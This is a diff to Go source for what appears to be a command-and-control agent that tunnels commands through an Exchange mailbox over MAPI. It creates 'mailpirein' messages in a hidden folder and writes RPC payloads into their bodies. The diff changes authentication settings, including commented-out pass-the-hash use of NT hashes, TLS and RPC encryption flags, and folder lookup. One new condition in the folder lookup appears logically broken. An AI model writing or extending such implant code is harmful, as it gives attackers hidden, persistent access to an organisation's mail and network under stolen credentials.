@@ -100,13 +100,13 @@ func sendMessage(agent *Agent, rpc string) {
 
 	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PropertyTag{PropertyType: mapi.PtypString, PropertyID: 0x001A}, PropertyValue: utils.UniString("IPM.Note")}
 	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagConversationTopic, PropertyValue: utils.UniString("mailpirein")}
-	propertyTagx[2] = mapi.PidTagIconIndex
-	propertyTagx[3] = mapi.PidTagMessageEditorFormat
+	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagIconIndex, PropertyValue: []byte{0x00, 0x00, 0x00, 0x01}}
+	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagMessageEditorFormat, PropertyValue: []byte{0x02, 0x00, 0x00, 0x00}}
 	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNativeBody, PropertyValue: []byte{0x00, 0x00, 0x00, 0x01}}
 	propertyTagx[5] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("uncommailpirein")}
 	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNormalizedSubject, PropertyValue: utils.UniString("mailpirein")}
 
-	x, er := mapi.CreateMessage(folderid, propertyTagx)
+	msg, er := mapi.CreateMessage(folderid, propertyTagx)
 
 	if er != nil {
 		return
@@ -114,10 +114,10 @@ func sendMessage(agent *Agent, rpc string) {
 	//because I don't know..
 	rpc = string(append([]byte{0x41, 0x41}, []byte(rpc)...))
 	bodyProp := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagBody, PropertyValue: utils.UniString(rpc)}
-	mapi.SetPropertyFast(folderid, x.MessageID, bodyProp)
+	mapi.SetPropertyFast(folderid, msg.MessageID, bodyProp)
 
 	completeSubject := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("xxmailpirein")}
-	mapi.SetPropertyFast(folderid, x.MessageID, completeSubject)
+	mapi.SetPropertyFast(folderid, msg.MessageID, completeSubject)
 
 }
 
@@ -253,19 +253,19 @@ func deleteFolder() {
 func setupSession() error {
 	var config utils.Session
 	//setup our autodiscover service
-	config.Domain = agent.Domain
+	config.Domain = "" //agent.Domain
 	config.User = agent.Username
 	config.Pass = agent.Password
 	config.Email = agent.EmailAddress
-	if dec, err := hex.DecodeString(agent.Password); err == nil {
-		config.NTHash = dec
-		config.Pass = ""
-	}
+	//if dec, err := hex.DecodeString(agent.Password); err == nil {
+	//	config.NTHash = dec
+	//	config.Pass = ""
+	//}
 	config.Basic = false
-	config.Insecure = true
+	config.Insecure = false
 	config.Verbose = true
 	config.Admin = false
-	config.RPCEncrypt = false
+	config.RPCEncrypt = true
 	config.CookieJar, _ = cookiejar.New(nil)
 
 	autodiscover.SessionConfig = &config
@@ -286,7 +286,7 @@ func setupSession() error {
 	userDN := resp.Response.User.LegacyDN
 
 	if mapiURL == "" {
-		if resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
+		if resp, _, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(agent.EmailAddress, agent.URL, resp); err != nil {
 			exit(err)
 		}
 
@@ -326,6 +326,7 @@ func checkFolder(logon *mapi.RopLogonResponse) error {
 
 		if er == nil {
 			for k := 0; k < len(rows.RowData); k++ {
+				//utils.Info.Println(fromUnicode(rows.RowData[k][0].ValueArray))
 				//convert string from unicode and then check if it is our target folder
 				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
 					agent.FolderID = rows.RowData[k][1].ValueArray
@@ -342,16 +343,19 @@ func checkFolder(logon *mapi.RopLogonResponse) error {
 				return err
 			}
 
-			time.Sleep(time.Second * (time.Duration)(2))
+			time.Sleep(time.Second * (time.Duration)(5))
 
-			rows, _ = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
-
-			for k := 0; k < len(rows.RowData); k++ {
-				//convert string from unicode and then check if it is our target folder
-				if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
-					agent.FolderID = rows.RowData[k][1].ValueArray
-					break
+			rows, er = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
+			if er != nil || rows != nil {
+				for k := 0; k < len(rows.RowData); k++ {
+					//convert string from unicode and then check if it is our target folder
+					if fromUnicode(rows.RowData[k][0].ValueArray) == agent.FolderName {
+						agent.FolderID = rows.RowData[k][1].ValueArray
+						break
+					}
 				}
+			} else {
+				utils.Error.Println(err)
 			}
 		}
 	}
